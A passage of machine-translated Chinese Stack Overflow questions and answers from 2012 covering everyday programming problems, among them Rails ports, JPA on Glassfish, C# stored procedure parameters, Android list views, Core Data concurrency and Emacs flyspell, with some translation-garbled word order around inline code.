3.  在子句`setTempo`中用*选中* `throws InvalidTempoException`的和`throw`它标记。`else`这样，控制器或其他组件负责捕获无效的速度值并决定如何处理异常。
4.  抛出*运行时*InvalidTempoException。
5.  将 tempo 属性提取到 Tempo 类中，其中封装了“必须大于 0”。
6.  别的东西。

我问是因为我最近一直在探索常见的“分层架构”方法，尤其是领域层。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:56:40.013

> 歌曲有一个速度属性（一个 int），它应该总是一个正数

如果这是正确初始化的要求，`Song`那么您应该抛出相应的异常，例如`IllegalArgumentException`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-22T07:41:58.130

> 这个需求应该是领域模型的一部分还是外部的（例如在 SongManager / 业务逻辑层类中）？

领域相关的逻辑应该存在于领域模型中。将某些东西称为经理通常表明您只是不知道在哪里放置代码以及如何正确命名它。

> 没有。给定一个 Song 实例 s，s.setTempo(-10) 根本不会修改对象的状态。

如果您需要**尝试**设置速度并且您对将要传递的参数几乎没有控制权，那么忽略设置速度的失败是可以接受的。就像 UDP 协议一样——如果它失败了也没关系。只有我会相应地命名它 - 类似于 s.trySetTempo(-10)。

> 将速度设置为某个最小值，例如 1。

这就像第一个案例的扩展。只有当需要将歌曲速度默认接近零时，我想不出任何商业案例。

> 用选中的 throws InvalidTempoException 标记 setTempo 并将其抛出到 else 子句中。这样，控制器或其他组件负责捕获无效的速度值并决定如何处理异常。抛出运行时 InvalidTempoException。

抛出异常意味着任何试图设置节奏的东西都负责正确的输入，因为不应该出现预期的异常。通常，您还必须编写 canSetTempo（或类似 isTempoChangeable 之类的）指标方法，以便外部世界可以在尝试实际交易之前点击它。

> 将 tempo 属性提取到 Tempo 类中，其中封装了“必须大于 0”。

这取决于您的域的形状。如果其他任何东西（如 SoundSample 类、MidiClip 类）需要使用速度的概念，这可能是一个好主意。另外 - 如果它与您的业务几乎无关并且只会污染 Song 类中更有趣的逻辑，那么封装节奏可能会很好。

* * *

我个人喜欢当域模型提供答案时，如果操作可用，但操作本身会引发错误。这也可以制作更好的用户体验。负责改变速度的字段和按钮不会出现/被禁用 - 立即反馈某些事情还不能完成。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-20T19:57:41.067

如果 a`Song`对于零或负速度值无效，则这当然应该是在 内建模的不变量`Song`。

如果尝试了无效值，您应该抛出异常 - 这可以确保您没有`Song`处于无效状态。

# visual-studio-2010 - 无法安装 MSVCP100.dll

> ID：10676676
> 
> 赞同：0
> 
> 时间：2012-05-20T19:53:29.877
> 
> 标签：visual-studio-2010, qt, visual-c++, cmake

我正在使用 CMake 在 Windows 上使用 Visual Studio 2010 Express 构建基于 Qt 的应用程序。使用 cmake 进行配置时，出现以下错误：

```
System runtime library file does not exists:
'MSVC10_REDIST_DIR-NOTFOUND/x86/Microsoft.VC100.CRT/msvcp100.dll

System runtime library file does not exists:
'MSVC10_REDIST_DIR-NOTFOUND/x86/Microsoft.VC100.CRT/msvcr100.dll 
```

然后，当我尝试编译时，我收到了这个错误（在 Visual Studio 和 msbuild 中都尝试过）：

```
MSVCRT.lib(crtexew.obj) : error LNK2019: unresolved external symbol _WinMain@16 referenced in function ___tmainCRTStartup
C:\Users\Kurtis\sandbox\UDJ-Desktop-Client\build\src\Release\UDJ.exe : fatal error LNK1120: 1 unresolved externals 
```

我确定 Microsoft Visual C++ 2010 Express 没有附带[我需要的可再](http://www.cmake.org/pipermail/cmake/2011-May/044166.html)发行组件。所以我去微软的网站下载了可再发行文件（适用于[x86](http://www.microsoft.com/en-us/download/details.aspx?id=5555)和[x64](http://www.microsoft.com/en-us/download/details.aspx?id=14632)）。但是，安装后，我仍然收到上述配置和编译错误。有谁知道我做错了什么，或者如何解决我的问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:57:34.350

`_WinMain@16`是 Windows GUI 应用程序的入口点，因此源代码中缺少它，或者您没有编写 GUI 应用程序，在这种情况下，您的链接器标志不正确。

由于您使用的是 qt，因此请确保将 QtMain 库与您的项目链接。您可以通过在对 Find_Package 的调用中添加它来做到这一点，如下所示：

```
find_package(Qt4 4.7.0 COMPONENTS QtMain QtCore QtGui QtSQL Phonon REQUIRED) 
```

# ruby-on-rails - 如何为 Webrick 设置默认端口？

> ID：10676680
> 
> 赞同：7
> 
> 时间：2012-05-20T19:53:49.203
> 
> 标签：ruby-on-rails, webrick

我想设置默认端口

```
rails s 
```

到 3010，而不必说：

```
rails s -p 3010 
```

...每次。有任何想法吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-20T20:06:35.423

`Port`您可以通过添加以下代码来覆盖`config/boot.rb`

```
require 'rails/commands/server'
module Rails
  class Server
    alias :default_options_alias :default_options
    def default_options
      default_options_alias.merge!(:Port => 3010)
    end    
  end
end 
```

# spring - 创建 EntityManagerFactory 时出现异常 - 在 SerialContext 中查找“persistence/myPU”失败

> ID：10676683
> 
> 赞同：2
> 
> 时间：2012-05-20T19:54:01.757
> 
> 标签：spring, hibernate, jdbc, glassfish-3

我正在使用 Glassfish 应用程序服务器并尝试将我的 spring-hibernate Web 应用程序连接到我的数据库，我有以下配置：

在 Glassfish 中，我添加了一个 jdbc 连接并向数据库发送成功的 ping。

我还添加了一个带有 jndi 名称的 JDBC 资源（在 glassfish 中）：**jdbc/myResource**。此资源位于我创建和测试的连接池下（在步骤 1 中）。

我的 EntityManaget 用 @PersistenceContext 注释：

```
@PersistenceContext(unitName = "myPU")
protected EntityManager entityManager; 
```

在 \src\main\resources\META-INF\ 我创建了我的 persistence.xml 文件：

```
<persistence-unit name="myPU">
    <provider>org.hibernate.ejb.HibernatePersistence</provider>
    <jta-data-source>jdbc/myResource</jta-data-source>
    <properties>
        <!-- Glassfish transaction manager lookup -->
        <property name="hibernate.transaction.manager_lookup_class"
            value="org.hibernate.transaction.SunONETransactionManagerLookup" />
        <property name="hibernate.dialect" value="org.hibernate.dialect.H2Dialect"></property>
        <property name="hibernate.show_sql" value="true" />
        <property name="hibernate.default_schema" value="PUBLIC" />
        <property name="hibernate.format_sql" value="true" />
        <!-- Validates the existing schema with the current entities configuration -->
        <property name="hibernate.hbm2ddl.auto" value="validate" />
    </properties>
</persistence-unit> 
```

这就是我的 applicationContext 的样子：

```
bean id="txManager"
    class="org.springframework.orm.hibernate4.HibernateTransactionManager">
</bean>

<tx:annotation-driven transaction-manager="txManager" />

<jee:jndi-lookup id="emf" jndi-name="persistence/myPU" />

<!-- In order to enable EntityManager injection -->
<bean
    class="org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor">
    <property name="persistenceUnits">
        <map>
            <entry key="myPU" value="persistence/myPU" />
        </map>
    </property>
</bean> 
```

在我的 web.xml 中，我有：

```
<persistence-unit-ref>
<persistence-unit-ref-name>persistence/myPU</persistence-unit-ref-name>
<persistence-unit-name>myPU</persistence-unit-name> 
```

当我发布时，我不断收到：

没有定义名为“myPU”的 bean。有关详细信息，请参阅 server.log。

为什么要寻找作为 bean 的持久性单元？
任何想法我做错了什么？

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T16:33:57.200

已解决 - 我将 transaction-type="JTA" 添加到我的 persistence.xml。出于某种原因，我的印象是，如果我在我的 persistence.xml 中指定 jta-data-source，则默认事务类型应该是“JTA”，也许不是。我真的不明白我对这个解决方案的异常的关系，但目前我的 persistence.xml 有以下行：

```
<persistence-unit name="myPU" transaction-type="JTA"> 
```

它就像一个魅力。

# php - 从嵌套的大括号 php 创建树结构

> ID：10676684
> 
> 赞同：-2
> 
> 时间：2012-05-20T19:54:02.713
> 
> 标签：php, tree

我正在寻找从带有嵌套大括号的字符串创建树结构。有没有人这样做过？具有代码折叠功能的源代码编辑器使用它。我想用 php 来做，也许用正则表达式？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:24:25.353

这显然取决于您的字符串的内容。如果你非常幸运，

```
json_decode(strtr($str, '{}', '[]')) 
```

可能会奏效。幸运的意思是：你的字符串是一个有效的 JSON 数组，递归地包含除对象之外的任何东西，所有方括号都替换为大括号，字符串中没有大括号。例如：

```
$str = '{3.14, null, {1, "two", 3}, {{"4.1 A", "4.1 B"}, 4.2}, true}' 
```

另见[http://www.json.org/](http://www.json.org/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-31T15:45:23.307

一种解决方案是进行一些字符串处理以识别根节点的子树字符串并递归解析它们以创建最终树。

例如，如果带有嵌套大括号的根树字符串类似于“{1:AA{..child 1..}{..child 2..}{..child 3..}...{..child n ..}}”，可以先识别出子树字符串（child 1到child n），然后递归解析n个子字符串，直到构造出最终的树结构。

您可以参考此链接[http://moderntone.blogspot.tw/2013/08/a-general-algorithm-for-creating-tree.html](http://moderntone.blogspot.tw/2013/08/a-general-algorithm-for-creating-tree.html)到一篇介绍解决此类问题的一般思想/算法的博客文章关于从带有嵌套大括号或括号的字符串创建树结构。

# php - 读取表单中的所有字段

> ID：10676688
> 
> 赞同：-3
> 
> 时间：2012-05-20T19:54:26.257
> 
> 标签：php, forms, email

这个“formmail.asp” ASP 脚本接收到：

```
<form action="formmail.asp" method="POST"> 
```

阅读表单中的所有字段，构建包含所有字段的消息，然后将此字段和您的值发送到我的电子邮件。

```
msg = empty

for each field in Request.Form() // read ALL fields in form
    select case lcase(field) // small cap field_name
    case "subject","cco","cc","to","lines","redirect","importance","split","submit","b1","hidden" // ignore some fields
    case else
        msg = msg & (field & " = " & Request.Form(field) & chr(13) & chr(10)) // append a line: field_name = field_value
    end select
next 
```

请问，如何将这部分从 ASP 转换为 PHP？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:59:21.067

```
$msg='';
foreach ($_POST as $key=>$val) 
  if (!in_array($key, array("subject","cco","cc","to","lines","redirect","importance","split","submit","b1","hidden"))
    $msg .= "$key = $val\n"; 
```

# java - 无法从辅助类访问公共非静态类属性

> ID：10676689
> 
> 赞同：1
> 
> 时间：2012-05-20T19:54:28.667
> 
> 标签：java

我有以下两个课程：

```
public class Class1
{
    public Class1 randomvariable; // Variable declared

    public static void main(String[] args)
    {
        randomvariable = new Class1(); // Variable initialized
    }
}

public class Class2
{
    public static void ranMethod()
    {
        randomvariable.getSomething(); // I can't access the member "randomvariable" here even though it's public and it's in the same project?
    }
} 
```

我很确定这是我在这里遗漏的一个非常基本的东西，但我实际上遗漏了什么？Class1 成员“随机变量”是公共的，类也是公共的，并且两个类都在同一个项目中。我该怎么做才能解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-20T19:56:44.543

有两个问题：

首先，您尝试为`randomvariable`from分配一个值`main`，而没有`Class1`. 这在实例方法中是可以的，就像`randomvariable`隐含的那样`this.randomvariable`- 但这是一个静态方法。

其次，您`Class2.ranMethod`再次尝试从中读取值，而没有`Class1`涉及的实例。

了解什么是实例变量很重要。它是与类的特定实例相关联的值。因此，如果您有一个名为 的类`Person`，您可能有一个名为 的变量`name`。现在`Class2.ranMethod`，你实际上是在写：

```
name.getSomething(); 
```

这是没有意义的——首先，这段代码根本没有关联`Person`，其次，它没有说明涉及*到哪*个人。

同样在`main`方法中 - 没有实例，所以你没有上下文。

*这是一个确实*有效的替代程序，因此您可以看到不同之处：

```
public class Person {
    // In real code you should almost *never* have public variables
    // like this. It would normally be private, and you'd expose
    // a public getName() method. It might be final, too, with the value
    // assigned in the constructor.
    public String name;

    public static void main(String[] args) {
        Person x = new Person();
        x.name = "Fred";
        PersonPresenter.displayPerson(x);
    }
}

class PersonPresenter {

    // In a real system this would probably be an instance method
    public static void displayPerson(Person person) {
        System.out.println("I present to you: " + person.name);
    }
} 
```

正如您从评论中看出的那样，这仍然不是理想的代码 - 但我想与您的原始代码保持相当接近。

However, this now works: `main` is trying to set the value of an instance variable *for a particular instance*, and likewise `presentPerson` is given a reference to an instance as a parameter, so it can find out the value of the `name` variable *for that instance*.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:56:57.097

When you try to access `randomvariable` you have to specify where it lives. Since its a non-static class field, you need an instance of `Class1` in order to have a `randomvariable`. For instance:

```
Class1 randomclass;
randomclass.randomvariable.getSomething(); 
```

If it were a static field instead, meaning that only one exists per class instead of one per instance, you could access it with the class name:

```
Class1.randomvariable.getSomething(); 
```

# delphi - 如何避免 StringGrid 中的“打开 IME”弹出窗口？

> ID：10676691
> 
> 赞同：4
> 
> 时间：2012-05-20T19:55:02.457
> 
> 标签：delphi, ime

在 StringGrid 中，有时当我右键单击时会在下面看到不需要的菜单。这是 Windows 弹出窗口吗？

![弹出屏幕截图](../Images/e50f003f1044602345ebca567e4ed314.png)

如何防止出现此弹出窗口而不是我自己的？

我的选项中有 goAlwaysShowEditor。

我已将 StringGrid.PopupMenu 设置为我的弹出窗口。

如果右键单击，我已经设置了 StringGrid.OnMouseDown 以显示我的弹出窗口。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T20:12:38.783

您可以像这样覆盖虚拟`CreateEditor`方法（虽然不是一个好的解决方案，我知道:-)：

```
type
  TStringGrid = class(Grids.TStringGrid)
  protected
    function CreateEditor: TInplaceEdit; override;
  end;

implementation

function TStringGrid.CreateEditor: TInplaceEdit;
begin
  Result := inherited CreateEditor;
  TMaskEdit(Result).PopupMenu := Form1.PopupMenu1;
end; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-20T20:01:02.500

这是每个 Windows EDIT 控件中的弹出菜单。可能是世界上最知名的菜单（唯一的竞争来自系统菜单）。您*想要*它，因为您的用户*期望*它（并且*需要*它）。当您编辑单元格中的文本时，该`TStringGrid`控件实际上会创建一个标准的 Windows EDIT 控件，这很棒。这样你就得到了它的弹出菜单。

此外，要显示您自己的弹出菜单（当您不编辑单元格时），您不需要设置`OnMouseDown`处理程序。`PopupMenu`设置属性就足够了。事实上，使用`OnMouseDown`处理程序触发弹出菜单是非常糟糕的，因为这样菜单只会在用户右键单击控件时显示（而不是，例如，当他按下控件上的“上下文”按钮时）键盘）。

如果您真的希望显示自己的弹出菜单，即使用户正在编辑单元格，您也必须手动为他提供常用的撤消、复制、剪切、粘贴、Unicode 内容等选项。你肯定不想这样吗？

# rest - 如何在 Symfony 中访问另一个包中的控制器？

> ID：10676698
> 
> 赞同：0
> 
> 时间：2012-05-20T19:56:18.920
> 
> 标签：rest, symfony

我有一个提供 REST 接口的 Symfony 应用程序。当客户端请求 URL 时，资源会验证 URL 中的用户名/密码，然后提供访问权限。但是，验证 URL 的控制器位于另一个包中，并被称为`validateCredentialsAction`.

如何`validateCredentialsAction`从另一个包中的另一个控制器调用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:26:16.100

您可以根据[http://symfony.com/doc/master/cookbook/controller/service.html](http://symfony.com/doc/master/cookbook/controller/service.html)将您的身份验证控制器定义为服务，然后将其注入另一个控制器。

但是，这可能会出现问题，因为控制器操作应该返回一个 Response 对象，而不是指示身份验证是否成功的布尔值。

因此，最好重构您的代码并将身份验证部分提取到仅提供身份验证且不提供控制器功能的业务服务中，然后将该服务注入到两个控制器中。

# c# - 过程或函数需要未提供的参数 #2

> ID：10676700
> 
> 赞同：1
> 
> 时间：2012-05-20T19:56:39.747
> 
> 标签：c#, sql-server-2008

但是，我目前正在尝试为基于 Web 的应用程序完成交易；

```
Procedure or function 'completeTransaction' expects parameter '@dateTime', which was not supplied. 
```

这是该功能的副本。

```
public static void completeTransaction(string storeCode, string employeeId, DateTime Date, string itemListNoId)
{
    using (SqlConnection conn = new SqlConnection("Data Source = ; Initial Catalog =Business ; Integrated Security = true;"))
    {
        using (SqlCommand command = new SqlCommand("dbo.completeTransaction", conn))
        {
            command.CommandType = CommandType.StoredProcedure;
            command.Parameters.Add("@storeCode", SqlDbType.Int).Value = storeCode;
            command.Parameters.Add("@employeeId", SqlDbType.Int).Value = employeeId;
            **command.Parameters.Add("@Date", SqlDbType.DateTime).Value = Date;**
            command.Parameters.Add("@itemListNoId", SqlDbType.Int).Value = itemListNoId;
            conn.Open();

            command.ExecuteNonQuery();
            conn.Close();
        }
    }
} 
```

我的sql表包含以下表和类型（storeCode、INT、employee、INT、Date、DATETIME、itemListNoId、INT）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:59:43.390

> 需要参数**“@dateTime”**

您传递了一个名为 的参数`@Date`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T20:00:12.947

您不传递名为@dateTime 的参数。好像这条线

```
command.Parameters.Add("@Date", SqlDbType.DateTime).Value = Date; 
```

应该

```
command.Parameters.Add("@dateTime", SqlDbType.DateTime).Value = Date; 
```

但是如果没有 SP 源代码，就很难确定。请记住，SQL Server 抱怨的是参数的名称而不是其类型。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T20:00:45.247

参数名称错误：

```
command.Parameters.Add("@dateTime", SqlDbType.DateTime).Value = Date; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-07T22:39:27.423

如果你得到这个并且你已经传入了正确命名的参数，请检查 CommandType 是否设置为存储过程

```
cmd.CommandType = CommandType.StoredProcedure; 
```

我看到这些相同的症状花了很长时间来追踪每个参数是如何到达存储过程的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-11-07T14:48:11.347

正如先前的答案正确提到的那样，此错误的最可能原因是忘记将参数添加到`SqlCommand`或忘记将命令的类型设置为`CommandType.StoredProcedure`

如果您已经正确设置了上面并且仍然拉头发，那么这可能就是原因。

如果您将参数值设置为`null`（例如 `mySQLParam1.Value = valuePassedToMe`，如果`valuePassedToMe`是`null`），那么您将得到相同的错误（即*过程或函数'...' 需要参数'...'，但未提供*）。

这可以通过分配`DBNull.Value`何时需要值来解决`null`

IE

```
mySQLParam1.Value = valuePassedToMe ?? (object)DBNull.Value; 
```

* * *

当您分配`null`给参数时，ADO.Net 将其转换为`default`. 下面是一个来自 SQL Server Profiler 的示例。

```
exec dbo.MyStoredProcedure @mySQLParam1=default,@mySQLParam2=default,@mySQLParam3=default,... 
```

当您分配 DBNull.Value 时，生成的 SQL 变为：

```
exec dbo.MyStoredProcedure @mySQLParam1=NULL,@mySQLParam2=NULL,@mySQLParam3=NULL,... 
```

# mongoid - 如何在 Mongoid 中按集合设置“allow_dynamic_fields”？

> ID：10676709
> 
> 赞同：2
> 
> 时间：2012-05-20T19:57:33.343
> 
> 标签：mongoid

Mongoid 似乎只有应用程序范围的`Mongoid.allow_dynamic_fields`设置。但我希望每个集合都决定是否需要动态字段。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T01:32:05.653

这在 mongoid 3.x 中是不可能的，即使已经有拉取请求，[https://github.com/mongoid/mongoid/pull/2563](https://github.com/mongoid/mongoid/pull/2563)。这将在 mongoid 4.0 上发布。但是，如果您真的需要该功能，您可以在本地文件夹或 fork 中签出这 2 个提交，然后使用它。

# backbone.js - 主干.js + require.js + 用户认证

> ID：10676714
> 
> 赞同：7
> 
> 时间：2012-05-20T19:57:51.167
> 
> 标签：backbone.js, requirejs

开始学习backbone.js 和require.js。

不确定如何使用用户身份验证为 Web 应用程序构建文件。

似乎它应该像这样流动：

1.  在应用程序初始化时，查询服务器以检查身份验证会话状态；
    *   Q#1：我应该在哪里编写这个“初始化后”会话代码 - 在 /js/app.js 中？
    *   Q#2：我应该为此使用jQuery ajax，还是有更好的backbone.js 方法（我在示例中看到了对get()、fetch()、toJSON() 的引用）？
2.  如果成功，将身份验证数据存储在模型中（user_id、username、auth_token）。
    *   Q#3：我如何/在哪里初始化这个模型，以便我可以在整个模块中访问该数据？IE。我将有一个视图来显示“isLoggedIn.html”的模板，该模板将显示“Hello %username%！Logout”。我想从此模型访问“用户名”字段。目前，我只看到如何通过在视图的define[] 中引用它来创建新模型，所以我不知道如何访问在init 期间创建的模型。
3.  将使用 jQuery $.cookies 保存并获取此身份验证数据，因此如果用户离开页面并返回，我可以查询服务器以检查会话，而不是要求用户再次登录。
    *   Q#4：我如何将 jquery.cookies.js 插件包含到这个 requirejs 应用程序中，以便我以后可以像往常一样使用 $.cookies？我应该将此插件添加到define[] 列表中吗？我是否必须将其添加到 /js/jquery/loader.js 文件中？

谢谢您的帮助。

**编辑：**我使用[模块化主干](https://github.com/thomasdavis/backbonetutorials/tree/gh-pages/examples/modular-backbone)示例中的文件来创建我的网络应用程序。因此，当我谈论 /js/app.js 和 js/router.js 时，这就是我所指的文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-14T08:27:34.607

我也有同样的情况。我找到[了这篇文章](http://coenraets.org/blog/2012/01/backbone-js-lessons-learned-and-improved-sample-app/)，似乎在每个请求之前做某事的最佳选择是使用[这个解决方案](https://github.com/angelo0000/backbone_filters)。

在访问除 /login 之外的 URL 之前，我将通过 cookie 进行身份验证或运行登录视图。

关于包含其他文件夹的方式（jQuery cookie）——只需使用 require.js 机制：

1.  在您的主文件 'require.config' -> 'paths' 添加插件位置 (jqueryCokkie:)
2.  在“定义”下的视图中添加路径名（“jqueryCookie”）并将其传递给函数
3.  .js 文件应采用[以下结构](http://pastecode.com/Nl)（我尝试将代码示例粘贴到此处，但出现问题...）。

# android - ExpandableListView，每个项目有两个 TextView

> ID：10676716
> 
> 赞同：0
> 
> 时间：2012-05-20T19:58:01.940
> 
> 标签：android, listview, textview, expandablelistview

是否可以在 ExpandableListView 的项目中放置多个 TextView？我试过这个，但不工作，第二台电视没有显示：

group_item.xml

```
<TextView android:id="@+id/row_name"
     android:paddingLeft="5dp"
     android:textSize="18dp"
     android:textColor="@color/black"
     android:textStyle="normal"
     android:layout_width="320dp"
     android:layout_height="wrap_content"/>

<TextView android:id="@+id/row_desc"
    android:text="Some text here"
     android:paddingLeft="5dp"
     android:textSize="18dp"
     android:textColor="@color/black"
     android:textStyle="normal"
     android:layout_width="320dp"
     android:layout_height="wrap_content"/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T22:46:05.770

你还没有说是什么支持你的列表视图，所以我将展示一个带有游标的示例（假设是 SimpleCursorTreeAdapter）。

```
mAdapter = new MyExpandableListAdapter(
    mGroupsCursor,                                  // cursor supplying group data
    getActivity(),                                  // context
    R.layout.group_item,                            // Group row layout
    R.layout.child_item,                            // Child row layout
    new String[] { "column1", "column2" },          // Cursor columns from group cursorto be mapped to group view
    new int[] { R.id.row_name, R.id.row_desc },     // View ids to receive group column data
    new String[] { "child1", "child2"},             // Cursor columns from child cursor to be mapped to child view
    new int[] { R.id.child1, R.id.child2            // View ids to receive child column data
});    
lv.setAdapter(mAdapter);                        // Set your adapter 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:59:34.093

对的，这是可能的。但是你必须自己做绑定。因此制作一个自定义适配器并覆盖 bindGroupView 或 bindChildView 方法。

-编辑-

对不起，我对这个问题有点困惑。如果您只想填充两个文本视图，那么您不必覆盖 bindgroupview 或 bindchildview 方法。仅当您需要进行更复杂的绑定时。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-29T08:32:23.667

是的，有可能是我添加到 github 的示例。

我正在这个项目中处理冻结列 exp。别理他们。在适配器中，您将看到多个列

[https://github.com/huseyinDaVinci/Android/tree/master/ExpandableListView](https://github.com/huseyinDaVinci/Android/tree/master/ExpandableListView)

# objective-c - 隐藏我们使用 NSPrintOperation 时显示的窗口

> ID：10676719
> 
> 赞同：0
> 
> 时间：2012-05-20T19:58:23.390
> 
> 标签：objective-c, cocoa, nsprintoperation

我将下面的代码用于打印视图1，当我运行它时，会打开一个窗口，我应该选择设置并单击打印按钮，然后视图将打印。如何在代码中执行它（设置）（意味着窗口不直接打开使用我们在代码中设置的设置打印 view1）

```
NSPrintOperation *printOperation= [NSPrintOperation 

printOperationWithView:view1];
[printOperation runOperation]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:09:53.940

您可以通过在运行操作之前向`NSPrintPanel`对象发送`setShowsPrintPanel:`NO 参数来禁止显示对象。`NSPrintOperation`

像这样：

```
NSPrintOperation *printOperation= [NSPrintOperation printOperationWithView:view1];

[printOperation setShowsPrintPanel:NO];
[printOperation runOperation]; 
```

# android - `ListView.invalidateViews()` 和 'Adapter.notifyDataSetChanged()' 之间有什么区别吗？

> ID：10676720
> 
> 赞同：18
> 
> 时间：2012-05-20T19:58:48.197
> 
> 标签：android, android-listview

`ListView.invalidateViews()`和有什么区别`Adapter.notifyDataSetChanged()`吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-05-20T20:01:48.670

是的，有。

`ListView.invalidateViews()`用于告诉 ListView 使其所有子项视图无效（重绘它们）。 *请注意，视图数不必与项目数相等。*这是因为 ListView 会回收其项目视图并在您滚动时以智能的方式在屏幕上移动它们。

`Adapter.notifyDataSetChanged()`另一方面，是告诉适配器的观察者正在适配的内容发生了变化。通知数据集更改将导致列表视图再次调用您的适配器方法来调整滚动条、重新生成项目视图等...

大多数情况下，您会想使用`notifyDataSetChanged`而不是`invalidateViews`，但这当然取决于您要完成的工作。

# jquery - 页面加载时隐藏所有 jScrollpane 滚动条

> ID：10676723
> 
> 赞同：2
> 
> 时间：2012-05-20T19:58:57.430
> 
> 标签：jquery, scrollbar, hide, jscrollpane, onload

我正在使用 jScrollPane（这是一个很棒的插件）并在页面中创建了几个滚动条。

我还添加了悬停事件 - 使滚动条淡入淡出。

问题是我想在页面加载时隐藏所有滚动条，仅在将鼠标悬停在它们上方时才显示它们。

所以我用

```
$(document).ready({

$(".jspVerticalBar").hide();

}); 
```

这是行不通的。

令人惊讶的是，当在不同的上下文中（比如在某个事件函数中）调用那行代码时，它会成功执行。

我在这里做错了什么？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:03:11.000

一个合乎逻辑的解释是 jScrollPane 在计算元素高度并将其应用到滚动条处理程序之前等待您的图像被加载。

所以你可以试试：

```
$(window).load(function(){
  $(".jspVerticalBar").hide();
}); 
```

# core-data - 核心数据：从 NSOperation 中删除会导致“NSObjectInaccessibleException”并引用已删除的对象

> ID：10676726
> 
> 赞同：1
> 
> 时间：2012-05-20T19:59:15.420
> 
> 标签：core-data, concurrency, nsmanagedobject, nsmanagedobjectcontext, nsoperation

我的应用程序具有`NSOperation`获取和操作托管对象的子类。我的应用程序还定期从数据库中清除行，这可能导致以下竞争条件：

*   后台操作获取一堆对象（从特定于线程的上下文中）。它将遍历这些对象并使用它们的属性做一些事情。
*   在主托管对象上下文中删除了一堆行。
*   后台操作访问从主上下文中删除的对象的属性。这导致一个`'NSObjectInaccessibleException', reason: 'CoreData could not fulfill a fault'`

*理想情况下，即使在 main context 中删除了一个*对象，也可以对 NSOperation 获取的对象进行操作。我认为实现这一目标的最佳方法是：

*   调用`[request setReturnsObjectsAsFaults:NO]`以确保 Core Data 不会尝试为不再存在于主上下文中的对象执行故障。这里的问题是我可能需要访问对象的关系，（据我了解）仍然会出错。
*   预先遍历托管对象并将我需要的属性复制到单独的非托管对象中。这里的问题是（我认为）我需要同步/锁定这部分，以防在完成复制之前在主上下文中删除了一个对象。

我错过了一些明显的东西吗？看起来我想要完成的事情并没有太不寻常。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T21:32:39.040

你说每个线程都有自己的上下文。那挺好的。但是，它们还需要与彼此的更改保持同步（如何取决于它们的层次结构）。

是全部分配给同一个持久存储协调器，还是它们具有父/子关系？

兄弟姐妹应该监视来自其他兄弟姐妹的 NSManagedObjectContextObjectsDidChangeNotification。当子上下文保存时，父母会自动收到通知。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-21T22:57:13.290

我最终通过在同一个队列上执行获取和删除来缓解这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-26T13:05:51.243

好问题，我只能提供部分答案，我也很想知道这一点。不幸的是，您自己的解决方案更多的是一种解决方法，但并不是真正的答案。如果后台操作很长，又不能在主线程上运行怎么办？

我可以说的一件事是您不必调用`[request setReturnsObjectsAsFaults:NO]`，因为提取请求会将数据加载到行缓存中，并且当某个提取的对象发生故障时不会返回数据库（请参阅 Apples 文档中的 NSFetchRequest ）。不过，这对人际关系没有帮助。

我尝试了以下方法：

1.  在`NSManagedObjectContextWillSave`收到通知时，等待当前后台任务完成并防止新任务以类似的方式开始

    ```
    -(void)contextWillSave:(NSNotification *)notification {
        dispatch_sync(self.backgroundQueue, ^{
            self.suspendBackgroundOperation = YES;
        });
    } 
    ```

2.  `NSManagedObjectContextDidSave`在通知上取消设置suspendBackgroundOperation

然而，dispatch_sync 调用引入了可能的死锁，因此这也不起作用（请参阅[我的相关问题](https://stackoverflow.com/questions/15381896/how-to-prevent-race-conditions-when-merging-changes-across-threads)）。另外，它仍然会阻塞主线程，直到可能冗长的后台操作完成。

# emacs - flyspell 纠正前一个到前一个错误

> ID：10676728
> 
> 赞同：2
> 
> 时间：2012-05-20T19:59:22.610
> 
> 标签：emacs, flyspell

假设我的缓冲区内容如下

```
teh msot | 
```

光标在`|`. 通常我可以通过单击`msot`来纠正（flyspell-auto-correct-previous-word）。我想要的是更正，即之前的错误。（或一般第 n 个咒语）`most``C-;``teh``the`

似乎`flyspell-auto-correct-previous-word`正在采用数值参数，但没有产生预期的结果。

我错过了什么。？

更新：

为什么我需要这个。，当我写研究笔记时，flyspell 错误地将一些科学单词标记为错误。所以需要跳过一两个假标记。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T21:36:04.820

